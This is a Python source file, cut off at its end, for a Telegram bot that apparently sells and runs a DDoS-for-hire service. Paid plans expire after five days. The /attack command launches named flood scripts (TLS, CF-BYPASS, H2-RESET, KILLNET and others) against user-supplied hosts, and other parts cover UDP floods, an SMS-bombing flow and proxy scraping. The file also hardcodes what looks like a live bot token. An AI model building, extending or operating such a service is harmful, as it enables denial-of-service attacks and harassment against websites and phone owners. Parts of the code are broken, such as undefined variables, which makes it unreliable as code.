#𝑐𝑜𝑑𝑒 𝑦𝑜𝑢𝑟 𝑜𝑤𝑛 𝑓𝑢𝑐𝑘𝑖𝑛𝑔 𝑠𝑘𝑖𝑑 
import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading


# 𝑝𝑙𝑒𝑎𝑠𝑒 𝑑𝑜𝑛𝑡 𝑚𝑜𝑑𝑖𝑓𝑦 𝑠𝑘𝑖𝑑

bot_token = '6687166596:AAFYxzo4AHkucSKZTASpVS1219kVQrkSp3M'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002357079779
#dont modify coded by infra
allowed_users = [6467994085]
processes = []
ADMIN_ID = 6467994085
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Coded by infra
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)
@bot.message_handler(func=lambda message: message.chat.id != allowed_group_id)
def handle_non_group_message(message):
    bot.reply_to(message, text='𝐵𝑜𝑡 𝑜𝑛𝑙𝑦 𝑤𝑜𝑟𝑘 𝑖𝑛 : https://t.me/+hOnf1MWpBqs0NzNl')



def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, '𝑌𝑜𝑢 𝑑𝑜𝑛𝑡 ℎ𝑎𝑣𝑒 𝑝𝑒𝑟𝑚𝑖𝑠𝑠𝑖𝑜𝑛 𝑡𝑜 𝑎𝑑𝑑 𝑝𝑙𝑎𝑛 𝑢𝑠𝑒𝑟')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Enter Correct Format /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=5)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()
#coded by infra
    bot.reply_to(message, f' ╭─❒ ⧼  𝐴𝐷𝐷𝐸𝐷 𝑃𝐿𝐴𝑁  ⧽\n├  {user_id} ℎ𝑎𝑣𝑒 𝑎𝑑𝑑 𝑝𝑙𝑎𝑛\n├ 𝑝𝑙𝑎𝑛 𝑏𝑒𝑓𝑜𝑟𝑒 𝑒𝑥𝑝𝑖𝑟𝑒 5 𝑑𝑎𝑦𝑠\n├ 𝑐𝑜𝑐𝑛: 1\n├ 𝑡𝑖𝑚𝑒: 120 𝑠𝑒𝑐𝑜𝑛𝑑𝑠\n├ 𝑛𝑜𝑟𝑚𝑎𝑙 𝑎𝑐𝑐𝑒𝑠𝑠\n╰❒ ⧼  𝐸𝑁𝐽𝑂𝑌  ⧽ ')

load_users_from_database()
#coded by infra
@bot.message_handler(commands=['start', 'help'])
def send_gif(message):
    chat_id = message.chat.id
    gif_url = 'https://i.ibb.co/C3hg1vbB/tumblr-eee9b192c1e51a482653155b3e201273-d088df7b-540.gif'  # Replace with your GIF URL or file path
    caption = "╭─❒ ⧼  🇨 🇴 🇲 🇲 🇦 🇳 🇩  ⧽\n├ [ 𝐿𝐴𝑌𝐸𝑅 7 - 𝐿𝐴𝑌𝐸𝑅 4 ]\n├ 𝑂𝑤𝑛𝑒𝑟: @DarknetDdd\n├ 𝑉𝑒𝑟𝑠𝑖𝑜𝑛: 1\n├𝑃𝑙𝑎𝑡𝑓𝑜𝑟𝑚: 𝑈𝑏𝑢𝑛𝑡𝑢 𝑆𝑒𝑟𝑣𝑒𝑟\n├ 𝑏𝑙𝑎𝑐𝑘 𝑙𝑖𝑠𝑡: 𝑑𝑠𝑡𝑎𝑡\n╰❒ 𝑃𝑟𝑜𝑥𝑦 𝑢𝑝𝑑𝑎𝑡𝑒𝑑 \n\n╭─❒ 「 𝐴𝑇𝑇𝐴𝐶𝐾 𝐶𝑂𝑀𝑀𝐴𝑁𝐷 」\n├ /attack +  𝑚𝑒𝑡ℎ𝑜𝑑 + 𝑡𝑎𝑟𝑔𝑒𝑡\n├ /methods - 𝑉𝑖𝑒𝑤 𝑎𝑙𝑙 𝑚𝑒𝑡ℎ𝑜𝑑𝑠 𝑙𝑖𝑠𝑡\n├ /check + 𝑢𝑟𝑙 𝑣𝑖𝑒𝑤 𝑝𝑟𝑜𝑡𝑒𝑐𝑡𝑖𝑜𝑛 𝑜𝑓 𝑤𝑒𝑏𝑠𝑖𝑡𝑒\n├ /get_id -  𝑔𝑒𝑡 𝑦𝑜𝑢𝑟 𝑖𝑑\n╰❒\n \n╭─❒ 「 𝑆𝐸𝑇𝑇𝐼𝑁𝐺 」\n├ /get_proxy - 𝑢𝑝𝑑𝑎𝑡𝑒 𝑏𝑜𝑡 𝑝𝑟𝑜𝑥𝑦\n├ /list - 𝑣𝑖𝑒𝑤 𝑎𝑣𝑎𝑖𝑙𝑎𝑏𝑙𝑒 𝑝𝑟𝑥 \n├ /prx - 𝑔𝑒𝑡 𝑝𝑟𝑜𝑥𝑦\n├ /time - 𝑐ℎ𝑒𝑐𝑘 𝑏𝑜𝑡 𝑜𝑛𝑙𝑖𝑛𝑒 𝑡𝑖𝑚𝑒\n├ /code + 𝑢𝑟𝑙 - 𝑔𝑒𝑡 𝑠𝑟𝑐 𝑜𝑓 𝑤𝑒𝑏𝑠𝑖𝑡𝑒 \n├ /boss -  𝑠𝑒𝑒 𝑏𝑜𝑠𝑠 𝑐𝑜𝑚𝑚𝑎𝑛𝑑\n├ /admin - 𝑐𝑜𝑛𝑡𝑎𝑐𝑡 𝑏𝑜𝑡 𝑜𝑤𝑛𝑒𝑟\n├ [𝐶ℎ𝑎𝑛𝑛𝑒𝑙 - @ddosmarketplacebyinfra ]\n├ [ 𝑅𝑈𝐿𝐸𝑆 𝐾𝐸𝐸𝑃 𝐶𝐴𝐿𝑀 𝐴𝑁𝐷 𝐷𝐷𝑂𝑆 ]\n╰❒ "
#coded by infra
    bot.send_animation(chat_id, gif_url, caption=caption) 
    
#coded by infra
@bot.message_handler(commands=['list'])
def fa(message):

    help_text = '''
List :
HTTP : GET PROXY HTTP
HTTPS : GET PROXY HTTPS
SOCKS4 : GET PROXY SOCKS4
SOCKS5 : GET PROXY SOCKS5

'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['prx'])
def proxy(message):

        
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, '𝐵𝑂𝑇 𝐼𝑆 𝑂𝐹𝐹𝐿𝐼𝑁𝐸.')
        return
        #coded by infra
    args = message.text.split(" ")
    if len(args) != 2:
        bot.reply_to(message, "Please Use Syntax.\nExample: /prx + proxy type you want to get")
        return
    
    proxy_type = args[1].upper()
    if proxy_type not in ['HTTP', 'TRIS' , 'HTTPS', 'SOCKS4', 'SOCKS5']:
        bot.reply_to(message, "𝐼𝑁𝑉𝐴𝐿𝐼𝐷 𝐿𝐼𝑆𝑇 𝑃𝐿𝐸𝐴𝑆𝐸 𝑈𝑆𝐸 /𝐿𝐼𝑆𝑇 𝑇𝑂 𝑆𝐸𝐸 𝐿𝐼𝑆𝑇")
        return

    sources = {
        'HTTP': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://www.freeproxychecker.com/result/http_proxies.txt'
        ],
        'TRIS': [ ## error
            'https://onlytris.name.vn/get-proxy.php?key=Phongkhuenunglon'
        ],
        'HTTPS': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=https',
            'https://www.freeproxychecker.com/result/https_proxies.txt'
        ],
        'SOCKS4': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4'
        ],
        'SOCKS5': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5'
        ]
    }

    proxies = []
    for source in sources.get(proxy_type, []):
        try:
            response = requests.get(source)
            if response.status_code == 200:
                proxies.extend(response.text.splitlines())
        except:
            pass
#coded by infra
    if len(proxies) > 0:
        filename = 'INFRA-PROXY-{}.txt'.format(proxy_type.lower())

        with open(filename, 'w') as file:
            file.write('\n'.join(proxies))

        bot.send_document(message.chat.id, open(filename, 'rb'))
        bot.reply_to(message, "𝑅𝐸𝑄𝑈𝐸𝑆𝑇 𝑃𝑅𝑂𝑋𝑌 {} Requests.\nFile sent {} give @{}".format(proxy_type, filename, message.from_user.username))
    else:
        bot.reply_to(message, "𝐶𝑂𝑁𝑁𝑂𝑇 𝐺𝐸𝑇 𝑃𝑅𝑂𝑋𝑌 𝐿𝐼𝑆𝑇.")
        return
                                                      
@bot.message_handler(commands=['remove_plan'])
def remove_user(message):
    if admin_id != ADMIN_ID:
        bot.reply_to(message, "𝑦𝑜𝑢 𝑑𝑜𝑛𝑡 ℎ𝑎𝑣𝑒 𝑝𝑒𝑟𝑚𝑖𝑠𝑠𝑖𝑜𝑛 𝑡𝑜 𝑎𝑑𝑑 𝑝𝑙𝑎𝑛 𝑢𝑠𝑒𝑟")
        return

    try:
        # #coded by infra
        user_id_to_remove = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, "𝑝𝑙𝑒𝑎𝑠𝑒 𝑝𝑟𝑜𝑣𝑖𝑑𝑒 𝑎 𝑣𝑎𝑙𝑖𝑑 𝑖𝑑 𝑡𝑜 𝑟𝑒𝑚𝑜𝑣𝑒 𝑢𝑠𝑒𝑟 𝑝𝑙𝑎𝑛")
        return

    if user_id_to_remove in allowed_users:
        allowed_users.remove(user_id_to_remove)
        bot.reply_to(message, f' "𝑒𝑑𝑖𝑜𝑡 𝑢𝑠𝑒𝑟 {user_id_to_remove} ℎ𝑎𝑠 𝑏𝑒𝑒𝑛 𝑓𝑢𝑐𝑘 𝑜𝑢𝑡 𝑜𝑓 𝑡ℎ𝑒 𝑝𝑙𝑎𝑛" ')
    else:
        bot.reply_to(message, f'𝑢𝑠𝑒𝑟 {user_id_to_remove} 𝑖𝑠 𝑛𝑜𝑡 ℎ𝑎𝑣𝑒 𝑝𝑙𝑎𝑛.')
#coded by infra


@bot.message_handler(content_types=["new_chat_members"])
def welcome_new_member(message):
    for new_member in message.new_chat_members:
        welcome_text = f"ℎ𝑒𝑙𝑙𝑜 {new_member.first_name} 𝑤𝑒𝑙𝑐𝑜𝑚𝑒 𝑡𝑜 𝑑𝑑𝑜𝑠 𝑎𝑡𝑡𝑎𝑐𝑘 𝑔𝑟𝑜𝑢𝑝 𝑤𝑖𝑡ℎ 𝑗𝑢𝑗𝑢𝑠𝑡𝑢 𝑘𝑎𝑖𝑠𝑒𝑛, 𝑡𝑦𝑝𝑒 /start 𝑡𝑜 𝑠𝑡𝑎𝑟𝑡 𝑎𝑡𝑡𝑎𝑐𝑘"
        gif_url = "https://i.ibb.co/TB7wmbfr/hello.gif"  
        #coded by infra

        bot.send_message(message.chat.id, welcome_text)
        bot.send_animation(message.chat.id, gif_url)
      #coded by infra
        #coded by infra
@bot.message_handler(commands=['prvmethods'])
def prv_method(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'You dont have permission to see private methods')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, '/SALVAGE\n /STRIKE\n /GANGBANG')
        return

user_states = {}  #coded by infra

user_states = {}  # coded by infra

#coded by infra

user_states = {}  # infra 
#coded by infra

user_states = {}  # dont recode
user_states = {}  #coded by infra

@bot.message_handler(commands=['sms'])
def start_sms_process(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "Please input the number:")
    user_states[chat_id] = {"step": "awaiting_number"}

    #coded by infra
    try:
        subprocess.Popen(["python", "sms.py"])
        print("sms.py script started...\n", flush=True)
    except Exception as e:
        print(f"Error running sms.py: {e}", flush=True)

@bot.message_handler(func=lambda message: message.chat.id in user_states)
def handle_user_input(message):
    chat_id = message.chat.id
    user_data = user_states[chat_id]

    if user_data["step"] == "awaiting_number":
        if message.text.isdigit():
            user_data["number"] = message.text
            print(f"{user_data['number']}", flush=True)  # Print in terminal
            time.sleep(0.5)  # dont recode
            os.system("echo")  # dont recode
            bot.send_message(chat_id, "Please enter threads:")
            user_data["step"] = "awaiting_threads"
        else:
            bot.send_message(chat_id, "Invalid input. Please enter a valid number.")

    elif user_data["step"] == "awaiting_threads":
        if message.text.isdigit():
            user_data["threads"] = message.text
            print(f"{user_data['threads']}", flush=True)  # lmfao
            time.sleep(0.5)  # dont recode
            os.system("echo")  # lmfao
            bot.send_message(chat_id, "Please enter sleep:")
            user_data["step"] = "awaiting_sleep"
        else:
            bot.send_message(chat_id, "Invalid input. Please enter a valid number.")

    elif user_data["step"] == "awaiting_sleep":
        if message.text.isdigit():
            user_data["sleep"] = message.text
            print(f"{user_data['sleep']}", flush=True)  # 
            time.sleep(0.5)  # 
            os.system("echo")  
            
            # Confirm success
            bot.send_message(chat_id, "Successful SMS to the target ✅")

            #coded by infra
            del user_states[chat_id]
        else:
            bot.send_message(chat_id, "Invalid input. Please enter a valid number.")

                                                                        
@bot.message_handler(commands=['methods'])
def send_gif(message):
    chat_id = message.chat.id
    gif_url = 'https://i.ibb.co/XxkL7DLC/c3e1e47113a4bea928309e341b245dac.gif'  # Replace with your GIF URL or file path
    caption = "╭─❒ ⧼ 🇱 🇦 🇾 🇪 🇷  7 ⧽\n├ 𝑇𝐿𝑆 : ᵗˡˢ ˢᵒᶜᵏᵉᵗ ᶠˡᵒᵒᵈ ᵃᵗᵗᵃᶜᵏ ʷⁱᵗʰ ʰⁱᵍʰ ʳᵖˢ\n├ 𝐷𝐸𝑆𝑇𝑅𝑂𝑌 : ᵍᵒᵒᵈ ᶠᵒʳ ⁿᵒⁿ ᵖʳᵒᵗᵉᶜᵗᵉᵈ ᵗᵃʳᵍᵉᵗ\n├ 𝐶𝐹-𝐵𝑌𝑃𝐴𝑆𝑆 : ʲˢ ᵒᵖᵗⁱᵐⁱᶻᵉᵈ ᶠᵒʳ ᵇʸᵖᵃˢˢⁱⁿᵍ\n├ 𝐺𝑂𝐷 : ᵒᵖᵗⁱᵐⁱᶻᵉᵈ ᶠᵒʳ ᵇʸᵖᵃˢˢ ᶜᵃᵖᵗᶜʰᵃ \n├ 𝐻𝑇𝑇𝑃 : ʰᵗᵗᵖ-ʳᵉˢᵉᵗ ᶠᵒʳ ʰᵗᵗᵖ ᶜᵒᵒᵏⁱᵉᵈ\n├ 𝑆𝑇𝑂𝑅𝑀: ʳᵃⁱⁿ ᵐᵃⁿʸ ᵖʳᵒˣʸ \n├ 𝐾𝐼𝐿𝐿𝑁𝐸𝑇: ᵍᵒˡᵃⁿᵍ ᶠˡᵒᵒᵈᵉʳ\n├ 𝐻2-𝑅𝐸𝑆𝐸𝑇: ᵇᵉˢᵗ ᶜᵒᵐᵇⁱⁿᵉᵈ ʳᵃᵖⁱᵈ'ʳᵉˢᵉᵗ ' ᵗˡˢ\n├ 𝐶𝑅𝐼𝑆𝑆 : ᶠˡᵒᵒᵈ ᵘˢⁱⁿᵍ ʳᵃᵖⁱᵈ-ʳᵉˢᵉᵗ ᵖʳᵒˣⁱᵉᵈ\n├ 𝑊𝐸𝑁𝐷𝐸𝐿 : ᶠˡᵒᵒᵈ ᵘˢⁱⁿᵍ ᵘˢᵉʳ ᵃᵍᵉⁿᵗ ᵖʳᵒˣⁱᵉᵈ\n├ 𝐵𝑅𝑈𝑇𝐴𝐿 : ⁿᵒᵈᵉʲˢ ᵍᵒᵒᵈ ᶠᵒʳ ᵈᵈᵒˢ'ᵍᵘᵃʳᵈ\n├ 𝐼𝑁𝐹𝑅𝐴-𝐵𝑌𝑃𝐴𝑆𝑆 : ᵒᵖᵗⁱᵐⁱᶻᵉᵈ ᶜᶠ'ᵘᵃᵐ\n├ 𝑇𝐿𝑆-𝐼𝑁𝐹𝑅𝐴 : ʰᵗᵗᵖ'ˢᵗʳⁱⁿᵍ ᵈᵉᵇᵘᵍᵉʳ ᶠˡᵒᵒᵈ ᶜᶠ\n├ 𝑇𝐿𝑆-𝐴𝐿𝑇𝐻𝐸𝐴 : ᶠᵒʳ ᵍᵉᵒ'ᵇˡᵒᶜᵏ ᵇʸᵖᵃˢˢ \n├ 𝐻𝑂𝑀𝐸-𝐻𝑂𝐿𝐷 : 24/7 ᵖʳⁱᵛᵃᵗᵉ ᵐᵉᵗʰᵒᵈ \n╰❒ 𝐸𝑋𝐴𝑀𝑃𝐿𝐸:\n𝑎𝑡𝑡𝑎𝑐𝑘 𝑇𝐿𝑆 𝑥𝑥𝑥.𝑐𝑜𝑚\n\n╭─❒ 「 🇱 🇦 🇾 🇪 🇷  4 」\n├ [ 𝑈𝐷𝑃 𝑊𝑂𝑅𝐾𝐼𝑁𝐺 ]\n├ 𝑈𝐷𝑃-𝐾𝐼𝐿𝐿  - ᵘᵈᵖ ᵏⁱˡˡᵉʳ \n├ 𝑇𝐶𝑃 - ᵘⁿᵈᵉʳ ᵐᵃⁱⁿᵗᵉⁿᵃⁿᶜᵉ\n├ 𝑆𝑆𝐻 - ᵘⁿᵈᵉʳ ᵐᵃⁱⁿᵗᵉⁿᵃⁿᶜᵉ\n╰❒𝐸𝑋𝐴𝑀𝑃𝐿𝐸 / 𝑎𝑡𝑡𝑎𝑐𝑘 𝑇𝐶𝑃 10.0.0.1 80 \n ┻┳|\n┳┻| _\n┻┳| •.•). Have a good day\n┳┻|⊂ﾉ\n┻┳"
    bot.send_animation(chat_id, gif_url, caption=caption) 
    
@bot.message_handler(commands=['boss'])
def send_gif(message):
    chat_id = message.chat.id
    gif_url = 'https://i.ibb.co/sJ628pHc/3322425817.gif'
    caption = "/ᴘʀᴠ-ᴛʟs : ᴛʜɪs ᴍᴇᴛʜᴏᴅ ɪs ᴜsᴇ ᴀʟʟ ᴍᴇᴛʜᴏᴅs ɪɴ ᴏɴᴇ ᴀᴛᴛᴀᴄᴋ ( ᴘʀɪᴠᴀᴛᴇ )"
    bot.send_animation(chat_id, gif_url, caption=caption)   # Add your caption here

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # 
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "𝐴𝑇𝑇𝐴𝐶𝐾 𝐻𝐴𝑆 𝐵𝐸𝐸𝑁 𝐹𝐼𝑁𝐼𝑆𝐻 𝑇𝐼𝑀𝐸: 120 𝑠𝑒𝑐𝑜𝑛𝑑𝑠")
                
                return
        # 
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return
            
@bot.message_handler(commands=['attack', 'ddos'])
def attack_command(message):
    if not is_bot_active:
        bot.reply_to(message, '𝐵𝑂𝑇 𝐻𝐴𝑆 𝐵𝐸𝐸𝑁 𝑂𝐹𝐹𝐿𝐼𝑁𝐸.')
        return
    
    user_id = message.from_user.id
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='𝑠𝑜𝑟𝑟𝑦 𝑦𝑜𝑢 𝑑𝑜𝑛𝑡 ℎ𝑎𝑣𝑒 𝑒𝑛𝑜𝑢𝑔ℎ 𝑝𝑙𝑎𝑛 𝑐𝑜𝑛𝑡𝑎𝑐𝑡 @DarnetDdd 𝑡𝑜 𝑔𝑒𝑡 𝑦𝑜𝑢𝑟 𝑝𝑙𝑎𝑛 .')
        return
    
#coded by infra
    if len(message.text.split()) < 3:
        bot.reply_to(message, '𝑃𝑙𝑒𝑎𝑠𝑒 𝑒𝑛𝑡𝑒𝑟 𝑐𝑜𝑟𝑟𝑒𝑐𝑡 𝑠𝑦𝑛𝑡𝑎𝑥.\n𝑒𝑥𝑎𝑚𝑝𝑙𝑒:  /attack + [method] + [host]')
        return
#coded by infra
    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} 𝑝𝑙𝑒𝑎𝑠𝑒 𝑤𝑎𝑖𝑡 {remaining_time} 𝑠𝑒𝑐𝑜𝑛𝑑𝑠 𝑏𝑒𝑓𝑜𝑟𝑒 𝑢𝑠𝑒 𝑎𝑡𝑡𝑎𝑐𝑘 𝑎𝑔𝑎𝑖𝑛.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'SMS'] and len(args) < 4:
        bot.reply_to(message, f'Please enter the port as well.\nfor example: /attack {method} {host} [port]')
        return

    if method in ['UDP-FLOOD', 'SMS']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".dstat", ".count", ".lol"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'HTTP' or method == 'BRUTAL' or method == 'CF-BYPASS' or method == 'HTTPS' or method == 'INFRA-BYPASS' or method == 'TLS-INFRA' or method == 'TLS-ALTHEA' or method == 'CRISS' or method == 'WENDEL':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"𝑤𝑎𝑟𝑛𝑖𝑛𝑔 𝑎𝑡𝑡𝑎𝑐𝑘 𝑏𝑙𝑎𝑐𝑘𝑙𝑖𝑠𝑡 𝑏𝑎𝑛𝑛𝑒𝑑. {blocked_domain}")
                return

    if method in [ 'KILLNET', 'TLS', 'WENDEL', 'BRUTAL', 'GOD', 'CRISS', 'DESTROY', 'CF-BYPASS', 'INFRA-BYPASS', 'TLS-ALTHEA', 'TLS-INFRA', 'UDPFLOOD', 'H2-RESET', 'STORM', 'KILLNET']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "120", "60", "5"]
            duration = 120
        elif method == 'H2-RESET':
            command = ["node", "H2-RESET.js", host, "120", "64", "5", "proxt.txt"]
            duration = 120
        elif method == 'WENDEL':
            command = ["node", "WENDEL.js", host, "120", "64", "5", "proxy.txt" ]
        elif method == 'BRUTAL':
            command = ["node", "BRUTAL.js", host, "120", "64", "5", "proxy.txt" ]
            duration = 120
        elif method == 'CRISS':
            command = ["node", "CRISS.js", host, "120", "64", "5", "proxy.txt" ]
            duration = 120
        elif method == 'INFRA-BYPASS':
            command = ["node", "INFRA-BYPASS.js", host, "120", "64", "5", "proxy.txt"]
            duration = 120
        elif method == 'TLS-INFRA':
            command = ["node", "TLS-INFRA.js", host, "120", "64", "5", "proxy.txt"]
            duration = 120
        elif method == 'TLS-ALTHEA':
            command = ["node", "TLS-ALTHEA.js", host, "200", "120", "5", "proxy.txt" ]
            duration = 120
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "120", "64", "5", "proxy.txt"]
            duration = 120
        elif method == 'KILLNET':
            command = ["node", "KILLNET.js", host, "120", "10", "64"]
            duration = 120
        elif method == 'STORM':
            command = ["node", "STORM.js", host, "120", "64", "5", "proxy.txt"]
            duration = 120
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "120", "64", "5", "proxy.txt"]
            duration = 120
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port must be a positive integer.')
                return
            command = ["python", "sms.py", host, "100", "1"]
            duration = 90
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port must be a positive integer.')
                return
            command = ["python", "tcp.py", host, "200", "1", "10"]
            duration = 90
            return
            command = ["python", "getproxy.py && n"]

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        gif_url = "https://i.ibb.co/39L0NVpP/bf70d0da-198a-4c25-bf5b-973c76248b24.gif"
        bot.send_animation(message.chat.id, gif_url)  # Sends GIF
        bot.reply_to(message, f"シ︎🇸 🇺 🇨 🇨 🇪 🇸 🇸 シ︎\n╭─❒ ⧼ 𝐴𝑇𝑇𝐴𝐶𝐾 𝐿𝐴𝑈𝑁𝐶𝐻  ⧽\n├[ 𝐶𝑂𝑁𝑁𝐸𝐶𝑇𝐸𝐷 𝑇𝑂 𝑆𝐸𝑅𝑉𝐸𝑅 ]\n├ [ ATTACK SUCCESSFULY SENT ]\n├ ATTACKED BY ⧼ @{username}  ⧽\n├𝑇𝐴𝑅𝐺𝐸𝑇 ⧼ {host}  \n├ 𝑀𝐸𝑇𝐻𝑂𝐷 ⧼ {method} ⧽\n├TIME ⧼ {duration} ⧽ 𝑠𝑒𝑐𝑜𝑛𝑑𝑠\n├𝐶𝐻𝐸𝐶𝐾 𝑊𝐸𝐵» https://check-host.net/check-http?host={host}\n├𝑓𝑜𝑟 𝑚𝑜𝑟𝑒 𝑝𝑜𝑤𝑒𝑟 𝑚𝑒𝑠𝑠𝑎𝑔𝑒 @DarknetDdd\n╰❒ 𝐶ℎ𝑎𝑛𝑛𝑒𝑙 @ddosmarketplacebyinfra")
    else:
        bot.reply_to(message, '𝑖𝑛𝑣𝑎𝑙𝑖𝑑 𝑚𝑒𝑡ℎ𝑜𝑑 𝑡𝑦𝑝𝑒 /methods 𝑡𝑜 𝑠𝑒𝑒 𝑚𝑒𝑡ℎ𝑜𝑑 𝑙𝑖𝑠𝑡')

@bot.message_handler(commands=['UDP-KILL'])
def run_command(message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "𝑈𝑆𝐴𝐺𝐸: /UDP-KILL <𝑖𝑝> <𝑝𝑜𝑟𝑡>\n𝑒𝑥𝑎𝑚𝑝𝑙𝑒 : /UDP-KILL 10.0.0.1 80")
            return
        
        ip = parts[1]
        port = parts[2]

        # Start the process
        process = subprocess.Popen(["./UDPBYPASS", ip, port], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_processes[message.chat.id] = process

        bot.reply_to(message, f"𝐿𝐴𝑌𝐸𝑅 4\n𝐴𝑇𝑇𝐴𝐶𝐾 𝑆𝐸𝑁𝑇 {ip}:{port} \n𝑇𝐼𝑀𝐸 120 𝑆𝐸𝐶𝑂𝑁𝐷𝑆.")
#coded by infra hex
        threading.Thread(target=stop_process, args=(message.chat.id, process), daemon=True).start()

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def stop_process(chat_id, process):
    time.sleep(120)
    process.terminate()
    bot.send_message(chat_id, "𝐴𝑇𝑇𝐴𝐶𝐾 𝐻𝐴𝑆 𝐵𝐸𝐸𝑁 𝐹𝐼𝑁𝐼𝑆𝐻 𝑇𝐼𝑀𝐸: 120 𝑠𝑒𝑐𝑜𝑛𝑑𝑠.")
    active_processes.pop(chat_id, None)    

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"𝑡𝑜𝑡𝑎𝑙 𝑝𝑟𝑜𝑥𝑖𝑒𝑠: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "𝑛𝑜𝑡 𝑓𝑜𝑢𝑛𝑑 𝑝𝑟𝑜𝑥𝑦.𝑡𝑥𝑡")
    else:
        bot.reply_to(message, '𝑦𝑜𝑢 𝑑𝑜𝑛𝑡 ℎ𝑎𝑣𝑒 𝑝𝑒𝑟𝑚𝑖𝑠𝑠𝑖𝑜𝑛 𝑡𝑜 𝑢𝑠𝑒 𝑡ℎ𝑖𝑠 𝑐𝑜𝑚𝑚𝑎𝑛𝑑.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"𝑡ℎ𝑒 𝑡𝑜𝑡𝑎𝑙 𝑜𝑓 𝑢𝑝𝑑𝑎𝑡𝑒𝑑 𝑝𝑟𝑜𝑥𝑦 𝑖𝑠: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

      
        
@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, '𝑦𝑜𝑢 𝑑𝑜𝑛𝑡 ℎ𝑎𝑣𝑒 𝑝𝑒𝑟𝑚𝑖𝑠𝑠𝑖𝑜𝑛 𝑡𝑜 𝑠𝑒𝑒 𝑐𝑝𝑢 𝑖𝑛𝑓𝑜.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ 𝐶𝑃𝑈 𝑢𝑠𝑎𝑔𝑒: {cpu_usage}%\n💾 𝑀𝑒𝑚𝑜𝑟𝑦 𝑢𝑠𝑎𝑔𝑒: {memory_usage}%')

@bot.message_handler(commands=['get_id'])
def get_user_id(message):
    user_id = message.from_user.id
    bot.reply_to(message, f"𝑦𝑜𝑢𝑟 𝑢𝑠𝑒𝑟 𝑖𝑑 𝑖𝑠: {user_id}")


@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
